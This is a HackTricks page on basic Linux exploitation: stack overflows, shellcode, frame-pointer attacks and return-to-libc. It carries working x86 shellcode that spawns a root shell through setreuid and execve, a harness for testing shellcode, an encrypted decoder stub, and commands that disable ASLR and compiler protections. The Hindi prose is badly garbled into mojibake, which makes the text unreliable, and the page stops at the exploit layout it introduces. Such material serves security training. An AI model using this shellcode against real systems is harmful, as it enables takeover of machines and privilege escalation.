# рд▓рд┐рдирдХреНрд╕ рдЕрдХреНрд╖рдореАрдХрд░рдг (рдореВрд▓рднреВрдд) (SPA)

## рд▓рд┐рдирдХреНрд╕ рдЕрдХреНрд╖рдореАрдХрд░рдг (рдореВрд▓рднреВрдд) (SPA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдПрдХ **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PR рдЬрдорд╛ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ**ред

</details>

## **ASLR**

рдЕрджреНрдпрддрди рдпрд╛рджреГрдЪреНрдЫрд┐рдХрддрд╛ рдкрддреЛрдВ (ASLR)

**рд╡реИрд╢реНрд╡рд┐рдХ рдЕрджреНрдпрддрди рдпрд╛рджреГрдЪреНрдЫрд┐рдХрддрд╛ (ASLR) рдЕрдХреНрд╖рдо рдХрд░реЗрдВ (рд░реВрдЯ)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
рд╡реИрд╢реНрд╡рд┐рдХ рдЕрджреНрдпрддрди рдпрд╛рджреГрдЪреНрдЫрд┐рдХрддрд╛ (ASLR) рд╕рдХреНрд╖рдо рдХрд░реЗрдВ: echo 2 > /proc/sys/kernel/randomize\_va\_space

**рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдЕрдХреНрд╖рдо рдХрд░реЗрдВ** (рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ):\
setarch \`arch\` -R ./рдЙрджрд╛рд╣рд░рдг рддрд░реНрдХ\
setarch \`uname -m\` -R ./рдЙрджрд╛рд╣рд░рдг рддрд░реНрдХ

**рд╕реНрдЯреИрдХ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдВрд░рдХреНрд╖рдг рдЕрдХреНрд╖рдо рдХрд░реЗрдВ**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack рдЙрджрд╛рд╣рд░рдг.c -o рдЙрджрд╛рд╣рд░рдг

**рдХреЛрд░ рдлрд╝рд╛рдЗрд▓**\
ulimit -c unlimited\
gdb /exec рдХреЛрд░\_рдлрд╝рд╛рдЗрд▓\
/etc/security/limits.conf -> \* soft core unlimited

**рдкрд╛рда**\
**рдбреЗрдЯрд╛**\
**BSS**\
**рдвреЗрд░**

**рд╕реНрдЯреИрдХ**

**BSS рдЦрдВрдб**: рд╢реВрдиреНрдпрд╛рд░реНрдердХ рд╡реИрд╢реНрд╡рд┐рдХ рдпрд╛ рд╕реНрдерд╛рдпреА рдЪрд░ рдмрд┐рдирд╛ рдЖрд░рдВрднрд┐рдд
```
static int i;
```
**рдбреЗрдЯрд╛ рдЕрдиреБрднрд╛рдЧ**: рдЧреНрд▓реЛрдмрд▓ рдпрд╛ рд╕реНрдерд┐рд░рд┐рдд рдХреА рдЧрдИ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЪрд░реЛрдВ
```
int i = 5;
```
**рдЯреЗрдХреНрд╕реНрдЯ рдЦрдВрдб**: рдХреЛрдб рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ (рдУрдкрдХреЛрдб) 

**рд╣реАрдк рдЦрдВрдб**: рдбрд╛рдЗрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ рдЖрд░рдХреНрд╖рд┐рдд рдмрдлрд░ (malloc(), calloc(), realloc())

**рд╕реНрдЯреИрдХ рдЦрдВрдб**: рд╕реНрдЯреИрдХ (рдкрд╛рд╕ рдХрд┐рдП рдЧрдП рддрд░реНрдХ, рдкрд░реНрдпрд╛рд╡рд░рдг рд╕реНрдЯреНрд░рд┐рдВрдЧ (env), рд╕реНрдерд╛рдиреАрдп рдЪрд░рд╡рд╛рд╣реА ...)

## **1. рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ**

> рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ, рдмрдлрд░ рдУрд╡рд░рд░рди, рд╕реНрдЯреИрдХ рдУрд╡рд░рд░рди, рд╕реНрдЯреИрдХ рд╕реНрдореИрд╢рд┐рдВрдЧ

рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ рдпрд╛ рд╕реЗрдЧрдореЗрдВрдЯ рд╡рд┐рд▓реЛрдкрди: рдЬрдм рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдирд╣реАрдВ рдХреА рдЧрдИ рдореЗрдореЛрд░реА рдкрддреЗ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рднреАрддрд░ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execve рдХреЛрд▓

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

рдХрд░реНрдирд▓ рдЗрдВрдЯрд░рдкреНрдЯ рджреЗрдЦреЗрдВ: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep тАЬ\_\_NR\_тАЭ

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(тАЬ/bin/shтАЭ, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax рдХреЛ рд╕рд╛рдлрд╝ рдХрд░реЗрдВ\
xor ebx, ebx ; ebx = 0 рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рдЖрд░реНрдЧреБрдореЗрдВрдЯ рдкрд╛рд╕ рдирд╣реАрдВ рдХрд░рдирд╛ рд╣реИ\
mov al, 0x01 ; eax = 1 тАФ> \_\_NR\_exit 1\
int 0x80 ; рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЛ рдЪрд▓рд╛рдПрдВ

**nasm -f elf assembly.asm** тАФ> рд╣рдореЗрдВ .o рдлрд╝рд╛рдЗрд▓ рджреЗрддрд╛ рд╣реИ\
**ld assembly.o -o shellcodeout** тАФ> рдпрд╣ рдПрдХ рдирд┐рд╖реНрдкрд╛рджрдиреАрдп рдлрд╝рд╛рдЗрд▓ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрд╕реЗрдВрдмрд▓реА рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╣рдо **objdump** рдХреЗ рд╕рд╛рде рдУрдкрдХреЛрдб рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ\
**objdump -d -Mintel ./shellcodeout** тАФ> рд╣рдорд╛рд░реЗ рд╢реЗрд▓рдХреЛрдб рд╣реИ рдФрд░ рдУрдкрдХреЛрдб рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП

**рд╢реЗрд▓рдХреЛрдб рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдЬрд╛рдВрдЪреЗрдВ**
```
char shellcode[] = тАЬ\x31\xc0\x31\xdb\xb0\x01\xcd\x80тАЭ

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╣реЛ рд░рд╣реЗ рд╣реИрдВ, рдкрд┐рдЫрд▓реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ **strace ./рдХрдВрдкрд╛рдЗрд▓_рдХрд┐рдпрд╛_рдЧрдпрд╛_рдкреНрд░реЛрдЧреНрд░рд╛рдо** рдореЗрдВ рджрд┐рдЦрдиреА рдЪрд╛рд╣рд┐рдПред

рд╢реЗрд▓рдХреЛрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдкрд╣рд▓рд╛ рдирд┐рд░реНрджреЗрд╢ рдПрдХ рдХреЙрд▓ рдХреЛ рдЬрдВрдк рдХрд░рддрд╛ рд╣реИред рдХреЙрд▓ рдореВрд▓ рдХреЛрдб рдХреЛ рдмреБрд▓рд╛рддрд╛ рд╣реИ рдФрд░ рд╕рд╛рде рд╣реА EIP рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИред рдХреЙрд▓ рдирд┐рд░реНрджреЗрд╢ рдХреЗ рдмрд╛рдж, рд╣рдордиреЗ рдЖрд╡рд╢реНрдпрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдбрд╛рд▓ рджрд┐рдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЙрд╕ EIP рдХреЗ рд╕рд╛рде рд╣рдо рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд╛рде рд╣реА рдХреЛрдб рдХреЛ рдЖрдЧреЗ рдЪрд▓рд╛рдирд╛ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг **рдЯреНрд░рд┐рдХ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al ├║ltimo call
popl                %esi                                       ; Guardamos en ese la direcci├│n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=тАЬ/bin/shтАЭ
leal                 0x8(%esi), %ecx      ; arg[2] = {тАЬ/bin/shтАЭ, тАЬ0тАЭ}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(тАЬ/bin/shтАЭ, [тАЬ/bin/shтАЭ, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci├│n
.string             \тАЭ/bin/sh\тАЭ                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
**рдПрд╕рдкреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ (/bin/sh) рд╕реНрдЯреИрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ:**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; тАЬ\0тАЭ
push               dword 0x68732f2f ; тАЬ//shтАЭ
push               dword 0x6e69622f; тАЬ/binтАЭ
mov                ebx, esp                     ; arg1 = тАЬ/bin//sh\0тАЭ
push               eax                             ; Null -> args[1]
push               ebx                             ; тАЬ/bin/sh\0тАЭ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(тАЬ/bin/shтАЭ, args[тАЬ/bin/shтАЭ, тАЬNULLтАЭ], NULL)
```
**рдИрдЬреЗ рдПрдлрдПрдирдПрд╕рдЯреАрдИрдПрдирд╡реА:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut├│ fabs
тАж
```
**рдЕрдВрдбрд╛ рд╣рдВрдЯрд░:**

рдпрд╣ рдПрдХ рдЫреЛрдЯрд╛ рдХреЛрдб рд╣реИ рдЬреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЬреБрдбрд╝реЗ рдореЗрдореЛрд░реА рдкреЗрдЬреЛрдВ рдХреЛ рджреМрдбрд╝рддрд╛ рд╣реИ рдФрд░ рд╡рд╣рд╛рдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╢реЗрд▓рдХреЛрдб рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ (рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдбрд╛рд▓реА рдЧрдИ рдХреЛрдИ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдвреВрдВрдврд╝рддрд╛ рд╣реИ)ред рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдереЛрдбрд╝реЗ рд╕реНрдерд╛рди рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИред

**рдкреЙрд▓рд┐рдореЙрд░реНрдлрд┐рдХ рд╢реЗрд▓рдХреЛрдбреНрд╕**

рдпреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╢реЗрд▓реНрд╕ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, Call-Pop рдХреЗ рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдпрд╣рд╛рдВ рдПрдХ **рд╕реАрдЬрд╝рд░ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЙрджрд╛рд╣рд░рдг** рд╣реЛрдЧрд╛:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer├б)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu├н va el shellcode
```
1. **рдлреНрд░реЗрдо рдкреЙрдЗрдВрдЯрд░ (EBP) рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдирд╛**

рдпрд╣ рдПрдХ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╣рдо EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди EIP рдХреЛ рдирд╣реАрдВред

рдпрд╣ рдЬреНрдЮрд╛рдд рд╣реИ рдХрд┐ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрд╕реЗрдВрдмрд▓реА рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```
movl               %ebp, %esp
popl                %ebp
ret
```
рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ, рдПрдХ рдлрд╝рдВрдХреНрд╢рди (fvuln) рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдкрд░ EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдмреБрд▓рд╛рдИ рдЧрдИ рд╣реИ, рдЬрдм рдлрд╝рдВрдХреНрд╢рди fvuln рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд▓реЗрдЧрд╛, рддреЛ рдЙрд╕рдХреЗ EIP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

fvuln рдореЗрдВ рдПрдХ рдЭреВрд▓рддрд╛ EBP рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╢реИрд▓рдХреЛрдб рдХреЗ рдкрддреЗ + 4 рдкрд░ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ (рдкреЙрдк рдХреЗ рд▓рд┐рдП 4 рдЬреЛрдбрд╝рдирд╛ рд╣реЛрдЧрд╛)ред рдЗрд╕ рддрд░рд╣, рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдкрд░, ESP рдореЗрдВ &(\&Shellcode)+4 рдХрд╛ рдорд╛рди рдбрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛, рдкреЙрдк рдХреЗ рд╕рд╛рде ESP рд╕реЗ 4 рдХрдо рд╣реЛрдЧрд╛ рдФрд░ рдЬрдм ret рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ рдпрд╣ рд╢реИрд▓рдХреЛрдб рдХреЗ рдкрддреЗ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдЧрд╛ред

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + рднрд░рд╛рдИ + &(\&Shellcode)+4

**Off-by-One Exploit**\
рдХреЗрд╡рд▓ EBP рдХреЗ рд╕рдмрд╕реЗ рдХрдо рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд╛рдЗрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред рдЗрд╕ рддрд░рд╣ рдХрд╛ рд╣рдорд▓рд╛ рдкрд┐рдЫрд▓реЗ рдЬреИрд╕рд╛ рд╣реА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╢реИрд▓рдХреЛрдб рдХреЗ рдкрддреЗ рдХреЛ рд░рдЦрдиреЗ рд╡рд╛рд▓реА рдореЗрдореЛрд░реА рдХреЛ EBP рдХреЗ рдкрд╣рд▓реЗ 3 рдмрд╛рдЗрдЯ рд╕рд╛рдЭрд╛ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

## **4. return to Libc рд╡рд┐рдзрд┐рдпрд╛рдБ**

рдЬрдм рд╕реНрдЯреИрдХ рдирд┐рд╖реНрдкрд╛рджрдиреАрдп рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЫреЛрдЯрд╛ рдмрдлрд░ рдЫреЛрдбрд╝рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╡рд┐рдзрд┐ рдЙрдкрдпреЛрдЧреА рд╣реЛрддреА рд╣реИред

ASLR рдХреЗ рдХрд╛рд░рдг, рдкреНрд░рддреНрдпреЗрдХ рдирд┐рд╖реНрдкрд╛рджрди рдкрд░, рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдореЗрдореЛрд░реА рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╡рд┐рдзрд┐ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВред рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдПрдХ рд╣реА рдкрддреЗ рдкрд░ рдирд┐рд░рдВрддрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИред

* **cdecl(C declaration)** рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рддрд╛рд░реНрдХрд┐рдХ рд╡рд┐рд╡рд░рдг рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рдмрд╛рдж рд╕реНрдЯреИрдХ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░рддрд╛ рд╣реИ
* **stdcall(standard call)** рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рддрд╛рд░реНрдХрд┐рдХ рд╡рд┐рд╡рд░рдг рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рд╕реНрдЯреИрдХ рдкрд░ рддрд╛рд░реНрдХрд┐рдХ рд╡рд┐рд╡рд░рдг рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕рд╛рдлрд╝ рдХрд░рддрд╛ рд╣реИ
* **fastcall** рдкрд╣рд▓реЗ рджреЛ рддрд╛рд░реНрдХрд┐рдХ рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдмрд╛рдХреА рдХреЛ рд╕реНрдЯреИрдХ рдкрд░

libc рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдкрддреЗ рдХреЛ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ "рдмрд┐рди / рд╢" рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдПрдХ рддрд╛рд░реНрдХрд┐рдХ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЖрдорддреМрд░ рдкрд░ рдПрдХ рд╡рд╛рддрд╛рдиреБрдХреВрд▓реНрдп рдЪрд░ рдХреЗ рд░реВрдк рдореЗрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХреНрдЬрд┐рдЯ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЬрдм рд╢реИрд▓ рдирд╣реАрдВ рдЪрд╛рд╣рд┐рдП рд╣реЛ, рдкреНрд░реЛрдЧреНрд░рд╛рдо рдмрд┐рдирд╛ рдХрд┐рд╕реА рд╕рдорд╕реНрдпрд╛ рдХреЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рдЬрд╛рдП (рдФрд░ рд▓реЙрдЧ рд▓рд┐рдЦреЗрдВ)ред

**рдирд┐рд░реНрдпрд╛рдд SHELL=/bin/sh**

рдЖрд╡рд╢реНрдпрдХ рдкрддреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:\
**p system**\
**p exit**\
**rabin2 -i executable** тАФ> рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рджреЗрддрд╛ рд╣реИ\
(рд╕реНрдЯрд╛рд░реНрдЯ рдпрд╛ рдХреЛрдИ рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ рдХреЗ рднреАрддрд░): **x/500s $esp** тАФ> рдпрд╣рд╛рдВ рддрдХ рдЦреЛрдЬреЗрдВ рдЬрд╣рд╛рдВ рддрдХ /bin/sh рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реИ

рдПрдХ рдмрд╛рд░ рдЬрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдЗрди рдкрддреЛрдВ рдХреЗ рдкрддреЗ рд╣реЛрдВрдЧреЗ, рддреЛ **exploit** рдЗрд╕ рддрд░рд╣ рд╣реЛрдЧрд╛:

